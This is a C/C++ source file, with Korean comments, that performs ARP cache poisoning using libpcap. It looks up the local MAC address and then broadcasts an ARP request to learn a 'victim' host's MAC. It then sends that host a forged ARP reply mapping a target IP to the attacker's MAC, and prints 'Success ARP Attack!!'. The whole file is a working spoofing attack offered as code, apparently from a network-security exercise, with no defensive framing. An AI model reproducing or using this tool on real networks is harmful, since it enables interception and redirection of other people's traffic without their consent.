#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <iostream>
#include <ifaddrs.h>
#include <netpacket/packet.h>

#define	ETHERTYPE_PUP	0x0200		/* PUP protocol */
#define	ETHERTYPE_IP	0x0800		/* IP protocol */
#define ETHERTYPE_ARP   0x0806		/* Addr. resolution protocol */


#define ARP_OPCODE_REQUEST	0x0001
#define ARP_OPCODE_REPLY	0x0002
#define ARP_HTYPE_ETHERNET	0x0001
#define ARP_HARDWARE_SIZE	0x06
#define ARP_PROTOCOL_SIZE	0x04


#pragma pack(push,1)
struct arp_header {
	uint16_t h_type;
	uint16_t p_type;
	uint8_t h_size;
	uint8_t p_size;
	uint16_t opcode;
	uint8_t s_mac[6];
	uint32_t s_ip;
	uint8_t t_mac[6];
	uint32_t t_ip;
};

struct	ether_header {
	u_char	ether_dhost[6];
	u_char	ether_shost[6];
	u_short ether_type;
};
#pragma pack(pop)

// Ethernet Header 구성 함수
struct ether_header make_ether_header(u_char dhost[6], u_char shost[6], u_short type, struct ether_header e_header) {

	for (int i = 0; i<6; i++)
	{
		e_header.ether_dhost[i] = dhost[i];
		e_header.ether_shost[i] = shost[i];
	}
	e_header.ether_type = htons(type);

	return e_header;
}



// ARP Header 구성 함수
struct arp_header make_arp_header(struct arp_header a_header, uint16_t h_type, uint16_t p_type, uint8_t h_size, uint8_t p_size, uint16_t opcode, uint8_t s_mac[6], uint32_t s_ip, uint8_t t_mac[6], uint32_t t_ip) {

	a_header.h_type = htons(h_type);
	a_header.p_type = htons(p_type);
	a_header.h_size = h_size;
	a_header.p_size = p_size;
	a_header.opcode = htons(opcode);

	for (int i = 0; i < 6; i++) {
		a_header.s_mac[i] = s_mac[i];
		a_header.t_mac[i] = t_mac[i];
	}

	a_header.s_ip = s_ip;
	a_header.t_ip = t_ip;

	return a_header;
}

// 나의 MAC Address를 가져오는 함수
void get_my_mac_address(char *dev, u_char my_mac_address[6]) {

	printf("Get My MAC Address...\n");
	struct ifaddrs *ifaddr = NULL;
	struct ifaddrs *ifa = NULL;
	int i = 0;

	if (getifaddrs(&ifaddr) == -1)
	{
		perror("getifaddrs");
	}
	else
	{
		for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
		{
			if ((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET))
			{
				struct sockaddr_ll *s = (struct sockaddr_ll*)ifa->ifa_addr;
				if (*dev == *(ifa->ifa_name)) {
					for (i = 0; i < s->sll_halen; i++)
					{
						my_mac_address[i] = s->sll_addr[i];
					}
				}
			}
		}
		freeifaddrs(ifaddr);
	}
}


// Victim의 MAC Address를 구해오는 함수
void get_victim_mac_addr(struct ether_header ether_header, struct arp_header arp_header, char* dev, char errbuf[PCAP_ERRBUF_SIZE], uint8_t v_mac[6]) {

	printf("Get Victim's MAC Address\n");
	printf("\n");

	u_char packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
	memcpy(packet, &ether_header, sizeof(struct ether_header));
	memcpy(packet + sizeof(ether_header), &arp_header, sizeof(struct arp_header));

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	}


	if (pcap_sendpacket(handle, packet, sizeof(packet)) == -1) printf("error\n");

	struct ether_header *r_ether_header;
	struct arp_header *r_arp_header;

	int i = 0;

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* r_packet;
		int res = pcap_next_ex(handle, &header, &r_packet);

		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		r_ether_header = (struct ether_header*)r_packet;
		r_packet += sizeof(struct ether_header);

		if (r_ether_header->ether_type == ntohs(ETHERTYPE_ARP)) {
			printf("Look up ARP Packet....!\n");
			r_arp_header = (struct arp_header*)r_packet;
			printf("ARP DATA\n");
			printf("SMAC = %02x:%02x:%02x:%02x:%02x:%02x\n", r_arp_header->s_mac[0], r_arp_header->s_mac[1], r_arp_header->s_mac[2], r_arp_header->s_mac[3], r_arp_header->s_mac[4], r_arp_header->s_mac[5]);
			printf("TMAC = %02x:%02x:%02x:%02x:%02x:%02x\n", r_arp_header->t_mac[0], r_arp_header->t_mac[1], r_arp_header->t_mac[2], r_arp_header->t_mac[3], r_arp_header->t_mac[4], r_arp_header->t_mac[5]);
			if (r_arp_header->s_ip == arp_header.t_ip) {   // 내가 보낸 ARP 패킷의 Target IP와 새로 받은 ARP 패킷의 Source IP가 일치할 경우 Hit으로 간주하여 저장함
				for (i = 0; i < 6; i++) {
					v_mac[i] = r_arp_header->s_mac[i];
				}
				printf("Success to get Victim's MAC Address!\n");
				break;
			}
		}
	}
}


// ARP 패킷을 전송하는 함수
void send_arp_packet(struct ether_header ether_header, struct arp_header arp_header, char* dev, char errbuf[PCAP_ERRBUF_SIZE]) {

	printf("Send ARP Packet...\n");
	printf("\n");

	u_char packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
	memcpy(packet, &ether_header, sizeof(struct ether_header));
	memcpy(packet + sizeof(ether_header), &arp_header, sizeof(struct arp_header));

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	}

	if (pcap_sendpacket(handle, packet, sizeof(packet)) == -1) printf("error\n");

}



void usage() {
	printf("syntax: pcap_test <interface>\n");
	printf("sample: pcap_test wlan0\n");
}


int main(int argc, char* argv[]) {

	printf("\n");
	printf("--------------------------------------------------------------------------------\n");
	printf("Program Start! \n");
	printf("\n");

	// Broadcast할 때 사용할 맥주소를 미리 저장
	u_char broadcast_mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff };
	u_char broadcast_tmac[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };

	int i = 0;

	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	uint sender_ip = inet_addr(argv[2]);
	uint target_ip = inet_addr(argv[3]);

	char errbuf[PCAP_ERRBUF_SIZE];

	// 나의 MAC Address를 저장할 배열 선언 및 저장
	u_char my_mac_address[6];
	get_my_mac_address(dev, my_mac_address);

	printf("My MAC Address = ");
	for (i = 0; i < 6; i++)
	{
		printf("%02x%c", my_mac_address[i], (i + 1 != 6) ? ':' : '\n'); \
	}
	printf("\n");

	// Broadcast할 이더넷 헤더 구성
	struct ether_header ether_header;
	ether_header = make_ether_header(broadcast_mac, my_mac_address, ETHERTYPE_ARP, ether_header);

	//Broadcast할 ARP헤더 구성
	struct arp_header arp_header;		
	arp_header = make_arp_header(arp_header, ARP_HTYPE_ETHERNET, ETHERTYPE_IP, ARP_HARDWARE_SIZE, ARP_PROTOCOL_SIZE, ARP_OPCODE_REQUEST, my_mac_address, target_ip, broadcast_tmac, sender_ip);	

	// Victim의 MAC Address를 저장할 배열 선언 및 저장
	uint8_t v_mac[6];
	get_victim_mac_addr(ether_header, arp_header, dev, errbuf, v_mac);

	printf("Victim's MAC Address = ");
	for (i = 0; i < 6; i++)
	{
		printf("%02x%c", v_mac[i], (i + 1 != 6) ? ':' : '\n');
	}

	printf("\n");

	// Victim에게 Unicast할 이더넷 헤더 및 ARP 헤더 구성
	ether_header = make_ether_header(v_mac, my_mac_address, ETHERTYPE_ARP, ether_header);
	arp_header = make_arp_header(arp_header, ARP_HTYPE_ETHERNET, ETHERTYPE_IP, ARP_HARDWARE_SIZE, ARP_PROTOCOL_SIZE, ARP_OPCODE_REPLY, my_mac_address, target_ip, v_mac, sender_ip);

	// ARP 패킷 전송
	send_arp_packet(ether_header, arp_header, dev, errbuf);

	printf("Success ARP Attack!!\n");
	printf("--------------------------------------------------------------------------------\n");
	printf("\n");

}

